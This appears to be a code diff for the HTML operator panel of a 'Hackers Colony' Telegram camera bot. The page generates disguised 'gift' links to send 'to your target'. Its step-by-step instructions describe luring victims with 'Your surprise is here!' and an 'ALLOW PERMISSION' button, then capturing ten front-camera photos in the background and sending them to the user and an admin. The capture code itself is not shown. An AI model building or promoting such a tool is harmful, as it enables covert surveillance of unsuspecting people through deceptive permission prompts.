@@ -17,101 +17,162 @@
             color: white;
             min-height: 100vh;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('https://i.imgur.com/mN8q9Yx.jpg') no-repeat center center;
+            background-size: cover;
+            opacity: 0.1;
+            z-index: -1;
         }
         
         .container {
             max-width: 500px;
             margin: 0 auto;
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .header {
             text-align: center;
             margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #2196F3;
         }
         
         .logo {
-            font-size: 36px;
+            font-size: 42px;
             font-weight: bold;
             background: linear-gradient(45deg, #ff0080, #ff8c00);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255, 0, 128, 0.3);
         }
         
         .subtitle {
             color: #aaa;
             font-size: 14px;
+            letter-spacing: 2px;
         }
         
         .welcome-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
+            background: rgba(33, 150, 243, 0.1);
+            padding: 25px;
             border-radius: 15px;
             margin-bottom: 25px;
             text-align: center;
+            border: 1px solid rgba(33, 150, 243, 0.3);
         }
         
         .welcome-title {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 26px;
+            margin-bottom: 15px;
             color: #4fc3f7;
         }
         
+        .welcome-text {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
         .features {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
             border-radius: 15px;
             margin-bottom: 25px;
         }
         
         .features-title {
-            font-size: 20px;
-            margin-bottom: 15px;
+            font-size: 22px;
+            margin-bottom: 20px;
             color: #69f0ae;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .feature-list {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
         }
         
         .feature-item {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
-            padding: 10px;
+            padding: 15px;
             background: rgba(255, 255, 255, 0.05);
             border-radius: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .feature-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
         }
         
         .feature-icon {
-            font-size: 24px;
+            font-size: 28px;
             margin-right: 15px;
             min-width: 40px;
+            color: #2196F3;
+        }
+        
+        .feature-text {
+            flex: 1;
         }
         
         .buttons {
-            display: flex;
-            flex-direction: column;
+            display: grid;
+            grid-template-columns: 1fr;
             gap: 15px;
             margin-bottom: 25px;
         }
         
         .btn {
-            padding: 18px 25px;
+            padding: 20px;
             border: none;
-            border-radius: 12px;
+            border-radius: 15px;
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             transition: all 0.3s ease;
             text-decoration: none;
             color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
         }
         
         .btn-generate {
@@ -128,11 +189,15 @@
         
         .btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
         }
         
         .btn:active {
             transform: translateY(0);
+        }
+        
+        .btn-icon {
+            font-size: 24px;
         }
         
         .instructions {
@@ -141,23 +206,21 @@
             border-radius: 15px;
             font-size: 14px;
             line-height: 1.6;
+            margin-bottom: 20px;
         }
         
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #888;
-            font-size: 12px;
-        }
-        
-        .icon {
-            font-size: 24px;
+        .instructions h3 {
+            color: #69f0ae;
+            margin-bottom: 15px;
         }
         
         .step {
             display: flex;
             align-items: flex-start;
             margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
         }
         
         .step-number {
@@ -174,7 +237,31 @@
             font-weight: bold;
         }
         
-        /* Gift Link Modal */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #888;
+            font-size: 12px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .btn {
+                padding: 18px;
+                font-size: 16px;
+            }
+            
+            .logo {
+                font-size: 36px;
+            }
+        }
+        
+        /* Gift Modal */
         .modal {
             display: none;
             position: fixed;
@@ -182,30 +269,35 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            background: rgba(0, 0, 0, 0.9);
             z-index: 1000;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
         
         .modal-content {
-            background: #1a1a2e;
-            padding: 30px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            padding: 40px 30px;
             border-radius: 20px;
             max-width: 500px;
-            width: 90%;
+            width: 100%;
             position: relative;
+            border: 2px solid #2196F3;
+            text-align: center;
         }
         
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
+        .modal-title {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #ff0080;
+            text-shadow: 0 0 20px rgba(255, 0, 128, 0.5);
+        }
+        
+        .modal-text {
+            margin-bottom: 30px;
+            line-height: 1.6;
+            font-size: 18px;
         }
         
         .link-box {
@@ -215,36 +307,55 @@
             margin: 20px 0;
             word-break: break-all;
             font-family: monospace;
+            font-size: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .copy-btn {
-            background: #4CAF50;
+            background: linear-gradient(45deg, #4CAF50, #8BC34A);
             color: white;
             border: none;
-            padding: 12px 25px;
-            border-radius: 8px;
+            padding: 15px 30px;
+            border-radius: 10px;
             cursor: pointer;
-            font-size: 16px;
+            font-size: 18px;
             width: 100%;
             margin-top: 10px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
         
         .success-message {
             color: #4CAF50;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 15px;
             display: none;
+            font-weight: bold;
         }
         
-        @media (max-width: 600px) {
-            .container {
-                padding: 20px;
-            }
-            
-            .btn {
-                padding: 15px;
-                font-size: 16px;
-            }
+        .close-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 30px;
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        
+        .close-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
         }
     </style>
 </head>
@@ -252,44 +363,76 @@
     <div class="container">
         <div class="header">
             <div class="logo">HCO CAMERA BOT</div>
-            <div class="subtitle">Official Hackers Colony Tool</div>
+            <div class="subtitle">HACKERS COLONY OFFICIAL</div>
         </div>
         
-        <div class="welcome-box">
+        <div class="welcome-box" id="welcomeSection">
             <div class="welcome-title">👋 Welcome to Hackers Colony</div>
-            <p>To use the bot, first join our Telegram channel:</p>
-            <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
-                <span class="icon">📢</span> JOIN TELEGRAM CHANNEL
-            </a>
-            <p style="margin-top: 15px; font-size: 14px;">After joining, click below:</p>
-            <button class="btn btn-generate" onclick="checkJoin()">
-                <span class="icon">✅</span> I HAVE JOINED - CHECK
-            </button>
-        </div>
-        
-        <div class="features" id="menu" style="display: none;">
-            <div class="features-title">🎮 MAIN MENU</div>
-            <p style="margin-bottom: 15px;">Welcome <b id="username">User</b>! Choose an option:</p>
+            <p class="welcome-text">To use the bot and access gift tools, you must first join our Telegram channel:</p>
             
             <div class="buttons">
-                <button class="btn btn-generate" onclick="showLinkGenerator()">
-                    <span class="icon">🎁</span> GENERATE GIFT LINK
+                <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
+                    <span class="btn-icon">📢</span> JOIN TELEGRAM CHANNEL
+                </a>
+                
+                <button class="btn btn-generate" onclick="checkChannelJoin()">
+                    <span class="btn-icon">✅</span> I HAVE JOINED - VERIFY
+                </button>
+            </div>
+        </div>
+        
+        <div class="features" id="menuSection" style="display: none;">
+            <div class="features-title">
+                <span class="btn-icon">🎮</span> MAIN MENU
+            </div>
+            
+            <p style="margin-bottom: 20px; font-size: 18px;">Welcome back, <b id="userName">User</b>! 👋</p>
+            
+            <div class="feature-list">
+                <div class="feature-item">
+                    <span class="feature-icon">🎁</span>
+                    <div class="feature-text">
+                        <strong>Generate Gift Links</strong>
+                        <div style="font-size: 14px; color: #aaa;">Create unique gift links to send to friends</div>
+                    </div>
+                </div>
+                
+                <div class="feature-item">
+                    <span class="feature-icon">📸</span>
+                    <div class="feature-text">
+                        <strong>Auto-Capture System</strong>
+                        <div style="font-size: 14px; color: #aaa;">Captures 10 images from front camera</div>
+                    </div>
+                </div>
+                
+                <div class="feature-item">
+                    <span class="feature-icon">📤</span>
+                    <div class="feature-text">
+                        <strong>Dual Delivery</strong>
+                        <div style="font-size: 14px; color: #aaa;">Sends images to both you and admin</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="buttons" style="margin-top: 25px;">
+                <button class="btn btn-generate" onclick="generateGiftLink()">
+                    <span class="btn-icon">🎁</span> GENERATE GIFT LINK
                 </button>
                 
                 <a href="https://t.me/Hackers_Colony_Official" class="btn btn-contact" target="_blank">
-                    <span class="icon">👑</span> CONTACT OWNER
+                    <span class="btn-icon">👑</span> CONTACT OWNER
                 </a>
                 
                 <a href="https://t.me/HackersColony" class="btn btn-channel" target="_blank">
-                    <span class="icon">📢</span> OUR CHANNEL
+                    <span class="btn-icon">📢</span> OUR CHANNEL
                 </a>
             </div>
             
             <div class="instructions">
-                <div class="features-title" style="font-size: 18px;">📋 How It Works:</div>
+                <h3>📋 How It Works:</h3>
                 <div class="step">
                     <div class="step-number">1</div>
-                    <div>Click "Generate Gift Link" to create a unique link</div>
+                    <div>Click "Generate Gift Link" to create unique link</div>
                 </div>
                 <div class="step">
                     <div class="step-number">2</div>
@@ -297,175 +440,165 @@
                 </div>
                 <div class="step">
                     <div class="step-number">3</div>
-                    <div>When they open it in Telegram, shows "Someone sent you a gift!"</div>
+                    <div>When they open, shows "Your surprise is here!"</div>
                 </div>
                 <div class="step">
                     <div class="step-number">4</div>
-                    <div>They click "UNLOCK GIFT" then "ALLOW TO SEE GIFT"</div>
+                    <div>They click "UNLOCK GIFT" then "ALLOW PERMISSION"</div>
                 </div>
                 <div class="step">
                     <div class="step-number">5</div>
-                    <div>Bot captures 10 images in background</div>
+                    <div>System captures 10 images in background</div>
                 </div>
                 <div class="step">
                     <div class="step-number">6</div>
-                    <div>Images sent to both you and admin automatically</div>
+                    <div>Images automatically sent to both you and admin</div>
                 </div>
             </div>
         </div>
         
         <div class="footer">
             © 2024 Hackers Colony | Official Camera Bot<br>
-            Contact: @Hackers_Colony_Official
+            Contact: @Hackers_Colony_Official | Channel: @HackersColony
         </div>
     </div>
     
     <!-- Gift Link Modal -->
-    <div class="modal" id="linkModal">
+    <div class="modal" id="giftModal">
         <div class="modal-content">
             <button class="close-btn" onclick="closeModal()">×</button>
-            <h2 style="color: #2196F3; margin-bottom: 15px;">🎁 Gift Link Generated!</h2>
-            <p>Copy this link and send to your target:</p>
-            <div class="link-box" id="generatedLink">
-                Loading...
+            
+            <div class="modal-title">🎁 GIFT LINK GENERATED</div>
+            
+            <div class="modal-text">
+                Copy this link and send to your target:<br>
+                They will see "Your surprise is here!" message
             </div>
-            <button class="copy-btn" onclick="copyLink()">
-                📋 Copy Link to Clipboard
+            
+            <div class="link-box" id="giftLinkText">
+                Loading gift link...
+            </div>
+            
+            <button class="copy-btn" onclick="copyGiftLink()">
+                <span class="btn-icon">📋</span> COPY LINK TO CLIPBOARD
             </button>
+            
             <div class="success-message" id="copySuccess">
                 ✅ Link copied successfully!
             </div>
             
-            <div style="margin-top: 25px; background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px;">
-                <h3 style="color: #69f0ae; margin-bottom: 10px;">📝 What happens when they open it?</h3>
-                <p>1. Shows "Someone sent you a gift!" 🎁</p>
-                <p>2. Click "UNLOCK GIFT" 🔓</p>
-                <p>3. Shows "Allow to see gift?" ✅</p>
-                <p>4. Captures 10 images in background 📸</p>
-                <p>5. Sends images to you & admin 📤</p>
+            <div style="margin-top: 30px; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 10px;">
+                <h3 style="color: #69f0ae; margin-bottom: 10px;">What happens when opened?</h3>
+                <p>1. Shows "🎉 Your surprise is here!"</p>
+                <p>2. Click "🔓 UNLOCK GIFT"</p>
+                <p>3. Click "✅ ALLOW PERMISSION"</p>
+                <p>4. 📸 Captures 10 images in background</p>
+                <p>5. 📤 Sends images to both you & admin</p>
             </div>
         </div>
     </div>
 
     <script>
-        // Function to check if user joined channel
-        function checkJoin() {
-            // In real implementation, this would check via bot API
-            // For demo, we'll simulate the check
+        // Check if user joined channel
+        function checkChannelJoin() {
+            const btn = document.querySelector('.btn-generate');
+            const originalText = btn.innerHTML;
             
-            // Show loading
-            const checkBtn = document.querySelector('.btn-generate');
-            const originalText = checkBtn.innerHTML;
-            checkBtn.innerHTML = '<span class="icon">⏳</span> Checking...';
-            checkBtn.disabled = true;
+            btn.innerHTML = '<span class="btn-icon">⏳</span> Verifying...';
+            btn.disabled = true;
             
-            // Simulate API check (2 seconds)
+            // Simulate API check (in real app, check via Telegram bot)
             setTimeout(() => {
                 // For demo - always show success
-                // In real app, integrate with Telegram bot to verify channel membership
+                alert('✅ Verification Successful! Welcome to Hackers Colony!');
                 
-                // Show success message
-                alert('✅ Verified! Welcome to Hackers Colony!');
+                // Hide welcome section
+                document.getElementById('welcomeSection').style.display = 'none';
                 
-                // Hide welcome box
-                document.querySelector('.welcome-box').style.display = 'none';
-                
-                // Show menu
-                document.getElementById('menu').style.display = 'block';
+                // Show menu section
+                document.getElementById('menuSection').style.display = 'block';
                 
                 // Reset button
-                checkBtn.innerHTML = originalText;
-                checkBtn.disabled = false;
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+                
+                // Set username
+                document.getElementById('userName').textContent = 'Member';
+                
+                // Store verification in localStorage
+                localStorage.setItem('hco_verified', 'true');
+                
             }, 2000);
         }
         
-        // Function to generate gift link
-        function showLinkGenerator() {
+        // Generate gift link
+        function generateGiftLink() {
             // Show modal
-            document.getElementById('linkModal').style.display = 'flex';
+            document.getElementById('giftModal').style.display = 'flex';
             
-            // Generate random link ID
-            const randomId = Math.random().toString(36).substring(2, 15) + 
-                           Math.random().toString(36).substring(2, 15);
+            // Generate random gift ID
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let giftId = '';
+            for (let i = 0; i < 20; i++) {
+                giftId += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
             
-            // Create Telegram bot link
-            const telegramLink = `https://t.me/hco_cam_bot?start=gift_${randomId}`;
+            // Create the actual Telegram bot link
+            const telegramLink = `https://t.me/hco_cam_bot?start=gift_${giftId}`;
             
-            // Display link
-            document.getElementById('generatedLink').textContent = telegramLink;
+            // Display in modal
+            document.getElementById('giftLinkText').textContent = telegramLink;
             
             // Store for copying
-            window.currentLink = telegramLink;
+            window.currentGiftLink = telegramLink;
             
-            // In real implementation, send this link to your backend
-            // to store in database and associate with user
-            console.log('Generated link:', telegramLink);
-            
-            // You would make an API call to your bot here:
-            // fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage?chat_id=USER_ID&text=New link generated: ${telegramLink}`);
+            // You can send this link to your backend API here
+            console.log('Generated gift link:', telegramLink);
         }
         
-        // Function to close modal
-        function closeModal() {
-            document.getElementById('linkModal').style.display = 'none';
-            document.getElementById('copySuccess').style.display = 'none';
-        }
-        
-        // Function to copy link to clipboard
-        function copyLink() {
-            const link = window.currentLink;
+        // Copy gift link to clipboard
+        function copyGiftLink() {
+            if (!window.currentGiftLink) return;
             
-            // Create temporary input element
             const tempInput = document.createElement('input');
-            tempInput.value = link;
+            tempInput.value = window.currentGiftLink;
             document.body.appendChild(tempInput);
             
-            // Select and copy
             tempInput.select();
-            tempInput.setSelectionRange(0, 99999); // For mobile
+            tempInput.setSelectionRange(0, 99999);
             document.execCommand('copy');
             
-            // Remove temporary element
             document.body.removeChild(tempInput);
             
             // Show success message
             const successMsg = document.getElementById('copySuccess');
             successMsg.style.display = 'block';
             
-            // Hide after 3 seconds
             setTimeout(() => {
                 successMsg.style.display = 'none';
             }, 3000);
         }
         
-        // Close modal when clicking outside
+        // Close modal
+        function closeModal() {
+            document.getElementById('giftModal').style.display = 'none';
+            document.getElementById('copySuccess').style.display = 'none';
+        }
+        
+        // Close modal on outside click
         window.onclick = function(event) {
-            const modal = document.getElementById('linkModal');
-            if (event.target == modal) {
+            if (event.target == document.getElementById('giftModal')) {
                 closeModal();
             }
         }
         
-        // Check if user is already verified (for page reload)
+        // Check if already verified
         document.addEventListener('DOMContentLoaded', function() {
-            // Check localStorage for previous verification
-            const isVerified = localStorage.getItem('hco_verified');
-            if (isVerified === 'true') {
-                document.querySelector('.welcome-box').style.display = 'none';
-                document.getElementById('menu').style.display = 'block';
-                
-                // Set username if available
-                const username = localStorage.getItem('hco_username') || 'User';
-                document.getElementById('username').textContent = username;
+            if (localStorage.getItem('hco_verified') === 'true') {
+                document.getElementById('welcomeSection').style.display = 'none';
+                document.getElementById('menuSection').style.display = 'block';
+                document.getElementById('userName').textContent = 'Verified Member';
             }
-            
-            // Save verification when checking
-            const checkBtn = document.querySelector('.btn-generate');
-            checkBtn.addEventListener('click', function() {
-                // In real app, after successful verification:
-                localStorage.setItem('hco_verified', 'true');
-                localStorage.setItem('hco_username', 'Hackers Colony Official');
-            });
         });
     </script>
 </body>
